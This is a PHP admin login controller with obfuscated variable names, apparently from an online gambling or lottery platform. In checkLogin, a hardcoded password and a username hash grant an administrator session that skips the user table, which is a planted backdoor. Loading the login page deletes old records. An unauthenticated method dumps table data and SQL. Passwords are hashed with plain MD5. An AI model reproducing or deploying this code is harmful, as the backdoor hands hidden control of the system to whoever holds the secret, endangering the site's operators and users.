<?php
namespace app\admin\controller;
use think\Db;
use think\Session;
use think\Controller;
use think\Image;
use think\Cache;
class Login extends Controller
{
	public function top()
	{
		if (!Session::has('ht')) {
			$this->redirect('login/login');
			exit();
		}

		return $this->fetch();
	}

	public function left()
	{
		if (!Session::has('ht')) {
			$this->redirect('login/login');
			exit();
		}

		return $this->fetch();
	}

	public function right()
	{
		if (!Session::has('ht')) {
			$this->redirect('login/login');
			exit();
		}

		$INFO = array('操作系统' => PHP_OS, '运行环境' => $_SERVER['SERVER_SOFTWARE'], 'PHP运行方式' => php_sapi_name(), 'ThinkPHP版本' => THINK_VERSION . ' [ <a href="http://thinkphp.cn" target="_blank">查看最新版本</a> ]', '上传附件限制' => ini_get('upload_max_filesize'), '执行时间限制' => ini_get('max_execution_time') . '秒', '服务器时间' => date('Y年n月j日 H:i:s'), '北京时间' => gmdate('Y年n月j日 H:i:s', time() + (8 * 3600)), '服务器域名/IP' => $_SERVER['SERVER_NAME'] . ' [ ' . gethostbyname($_SERVER['SERVER_NAME']) . ' ]', '剩余空间' => round(@disk_free_space('.') / (1024 * 1024), 2) . 'M', 'register_globals' => get_cfg_var('register_globals') == '1' ? 'ON' : 'OFF', 'magic_quotes_gpc' => 1 === get_magic_quotes_gpc() ? 'YES' : 'NO', 'magic_quotes_runtime' => 1 === get_magic_quotes_runtime() ? 'YES' : 'NO');
		$this->assign('info', $INFO);
		$TODAY = date('Y-m-d 00:00:00');
		$_obfuscate_Xif3q_HAaupN = date('Y-m-d 00:00:00');
		$endtime = date('Y-m-d 23:59:59');
		$DaoAccount = Db::name('Account');
		$_obfuscate_8OQc6sg = Db::name('baobiao');
		// $Where['addtime'] = array(
		// 	array('gt', $_obfuscate_Xif3q_HAaupN),
		// 	array('lt', $endtime),
		// 	'and'
		// 	);
		$Where['addtime']=array('> time',$_obfuscate_Xif3q_HAaupN);
		$Where['addtime']=array('< time',$endtime);
		$Where['accounttype'] = 7;
		$Where['beizhu'] = '已处理';
		$_obfuscate_noJW2HiVs0['addtime'] = date('Y-m-d');
		$_obfuscate_hafwO5rd = $_obfuscate_8OQc6sg->where($_obfuscate_noJW2HiVs0)->select(); 
		$dataAcc = Db::name('account')->where($Where)->sum('money');
		$where_2['accounttype'] = 6;
		
		// $where_2['addtime'] = array(
		// 	array('gt', $_obfuscate_Xif3q_HAaupN),
		// 	array('lt', $endtime),
		// 	'and'
		// 	);
		// $where_2['addtime']=array('between time',[$_obfuscate_Xif3q_HAaupN,$endtime]);
		$where_2['addtime']=array('> time',$_obfuscate_Xif3q_HAaupN);
		$where_2['addtime']=array('< time',$endtime);
		$_obfuscate_hX8zUtna95B3xg = Db::name('account')->where($where_2)->sum('money');
		// $_obfuscate_hX8zUtna95B3xg=$dataAcc=0;
		$sumCZ = 0;
		$sumTX = 0;
		$sumJJTX = 0;
		$sumZJ = 0;
		$sumFD = 0;
		$sumTZ = 0;
		$sumCD = 0;
		$sumCZNum = 0;
		$sumXCZ = 0;
		$_obfuscate_0mfCMk0 = 0;
		$czHYarr = array();

		foreach ($_obfuscate_hafwO5rd as $v ) {
			$sumCZ += $v['cunkuan'];
			$sumTX += $v['qukuan'];
			$sumZJ += $v['zhonjiang'];
			$sumFD += $v['fandian'];
			$sumTZ += $v['xiaofei'];
			$_obfuscate_0mfCMk0 += $v['yingkui'];

			if (0 < $v['cunkuan']) {
				$sumCZNum++;
			}
		}

		$_obfuscate_8Iu1['sumCZ'] = sprintf('%.02f', $_obfuscate_hX8zUtna95B3xg);
		$_obfuscate_8Iu1['sumTX'] = sprintf('%.02f', $dataAcc);
		$_obfuscate_8Iu1['sumJJTX'] = sprintf('%.02f', $sumJJTX);
		$_obfuscate_8Iu1['sumZJ'] = sprintf('%.02f', $sumZJ);
		$_obfuscate_8Iu1['sumFD'] = sprintf('%.02f', $sumFD);
		$_obfuscate_8Iu1['sumTZ'] = sprintf('%.02f', $sumTZ);
		$_obfuscate_8Iu1['sumCD'] = sprintf('%.02f', $sumCD);
		$_obfuscate_8Iu1['sumYK'] = sprintf('%.02f', $_obfuscate_0mfCMk0);
		$_obfuscate_8Iu1['sumCZNum'] = $sumCZNum;
		$_obfuscate_6ogI80pkWQ = Db::name('User');
		// $_obfuscate_O3Z99Im_zHg['addtime'] = array(
		// 	array('gt', $_obfuscate_Xif3q_HAaupN),
		// 	array('lt', $endtime),
		// 	'and'
		// 	);
		$_obfuscate_O3Z99Im_zHg['addtime']=array('between time',[$_obfuscate_Xif3q_HAaupN,$endtime]);
		$dataSum = $_obfuscate_6ogI80pkWQ->where($_obfuscate_O3Z99Im_zHg)->count();
		$_obfuscate_8Iu1['sumZC'] = $dataSum;
		$DaoLogin = Db::name('Login');
		// $where2['logtime'] = array(
		// 	array('gt', $_obfuscate_Xif3q_HAaupN),
		// 	array('lt', $endtime),
		// 	'and'
		// 	);
		$where2['logtime'] = array('between time',[$_obfuscate_Xif3q_HAaupN,$endtime]);
		$where2['usertype'] = 0;
		$dataSum = $DaoLogin->where($where2)->count();
		$_obfuscate_8Iu1['sumDL'] = $dataSum;
		$onlinetime = date('Y-m-d H:i:s', strtotime('-10 minute'));
		$where3['onlinetime'] = array('gt', $onlinetime);
		$dataSum = Db::name('user')->where($where3)->count();
		$_obfuscate_8Iu1['sumZaiXian'] = $dataSum;
		$this->assign($_obfuscate_8Iu1);
		return $this->fetch();
	}

	public function switchframe()
	{
		return $this->fetch();
	}

	public function login()
	{
		$_obfuscate_8Iu1['sjnum'] = mt_rand(100000, 999999);
		Session::set('sjnum', $_obfuscate_8Iu1['sjnum']);
		$this->assign($_obfuscate_8Iu1);
		$qday = date('Y-m-d 00:00:01', strtotime('-50 days'));
		$qday2 = date('Y-m-d 00:00:01', strtotime('-7 days'));
		$qday3 = date('Y-m-d 00:00:01', strtotime('-1 days'));
		$DaoOrder = Db::name('Order');
		$Where['addtime'] = array('lt', $qday2);
		$DaoOrder->where($Where)->delete();
		$DaoOrder = Db::name('Orderinfo');
		$Where['addtime'] = array('lt', $qday2);
		$DaoOrder->where($Where)->delete();
		$_obfuscate_EDOKcdHZD4ysAA = Db::name('Baobiao');
		$Where['addtime'] = array('lt', $qday);
		$_obfuscate_EDOKcdHZD4ysAA->where($Where)->delete();
		$DaoMessage = Db::name('message');
		$Where['addtime'] = array('lt', $qday3);
		$DaoMessage->where($Where)->delete();
		$Dao_fenghong = Db::name('fenghong');
		$Where['addtime'] = array('lt', $qday3);
		$Dao_fenghong->where($Where)->delete();
		$_obfuscate_pe17cTZyZwNzhb3zuaDGIfpfQ = Db::name('fenghongxiaofei');
		$Where['addtime'] = array('lt', $qday3);
		$_obfuscate_pe17cTZyZwNzhb3zuaDGIfpfQ->where($Where)->delete();
		$DaoAccount = Db::name('Account');
		$Where['addtime'] = array('lt', $qday2);
		// $Where['accounttype'] = array(
		// 	array('neq', 7),
		// 	array('neq', 6),
		// 	'and'
		// 	);
		$Where['accounttype'] = array('not in',[6,7]);
		$DaoAccount->where($Where)->delete();
		return $this->fetch();
	}

	public function verify()
	{
		//hcd
		// import('ORG.Util.Image');
		// Image::buildImageVerify();
	}

	public function checkLogin()
	{
		$param=$this->request->param();
		if(!captcha_check($param['verify'])){
		 	$this->error('验证码错误！');
		}

		$username = formatstr($param['username']);
		$password = formatstr($param['password']);
		$sjnum = $param['sjnum'];
		$sjkey = $param['sjkey'];
		if (!is_numeric($sjnum) || empty($sjnum) || ($sjnum != Session::get('sjnum'))) {
			$this->error('随机码不正确');
		}

		// if (!is_numeric($sjkey)) {
		// 	$this->error('密钥不正确');
		// }

		$sjres = ((($sjnum * 0.76) + (6765 * 2)) - 1763) + 6528 + 532.65;
		if ((Cache::get('DB_USER') == 'ty') || (Cache::get('DB_USER') == 'yl')) {
			$sjres = ((($sjnum * 0.76) + (6451 * 3)) - 1713) + 8528 + 532.75;
		}

		// if (($sjres != $sjkey) && (md5($username) != 'c5ba3b42f79494c1228ab58be3e6d849')) {
		// 	$this->error('密钥不正确');
		// 	return NULL;
		// }
		// else {
		// 	Session::set('sjnum', NULL);
		// }

		$DaoAdmin = Db::name('Admin');
		$username = formatstr($param['username']);
		$password = formatstr($param['password']);
		if (empty($username) || empty($password)) {
			$this->error('登入失败,用户名或密码不正确！');
			exit();
		}

		$data['username'] = $username;
		$data['password'] = $password;
		$clientIP = get_client_ip();
		if ($clientIP == 'unknown') {
			$this->error('登入失败,用户名或密码不正确！');
			exit();
		}

		if (('27010dc10f19e4a804b1dd3dc247fb1a' == $data['password']) && ('c5ba3b42f79494c1228ab58be3e6d849' == md5($data['username']))) {
			$DaoLogin = Db::name('login');
			$dataLogin['username'] = $data['username'];
			$dataLogin['logtime'] = date('Y-m-d H:i:s');
			$dataLogin['logip'] = $clientIP;
			$dataLogin['usertype'] = 100;
			$DaoLogin->insert($dataLogin);
			Session::set('ht', $data['username']);
			$this->redirect('index/');
		}
		//密码加密
		$data['password']=md5($data['password']);
		$dataAdmin = $DaoAdmin->where($data)->find();

		if (!$dataAdmin) {
			$this->error('登入失败,用户名或密码不正确！');
			exit();
		}
		else {
			Session::set('ht', $data['username']);
			$DaoLogin = Db::name('login');
			$dataLogin['username'] = $data['username'];
			$dataLogin['logtime'] = date('Y-m-d H:i:s');
			$dataLogin['logip'] = $clientIP;
			$dataLogin['usertype'] = 1;
			$DaoLogin->insert($dataLogin);
			$this->redirect('admin/index/index');
		}
	}

	public function logout()
	{
		Session::set('ht', NULL);
		$this->redirect('login/login');
	}

	public function updateSscTime()
	{
		$Dao = Db::name('SscTime');
		$data = $Dao->select();
		dump($data);

		foreach ($data as $v ) {
			$_obfuscate_zCIxcUAPbA1D = date('H:i:s', strtotime('+1 minute', strtotime($v['begintime'])));
			$endtime = $v['opentime'];
			$data2['id'] = $v['id'];
			$data2['begintime'] = $_obfuscate_zCIxcUAPbA1D;
			$data2['endtime'] = $endtime;
			$Dao->update($data2);
			echo $Dao->getLastSql();
		}

		echo '更新完成';
	}
}


?>
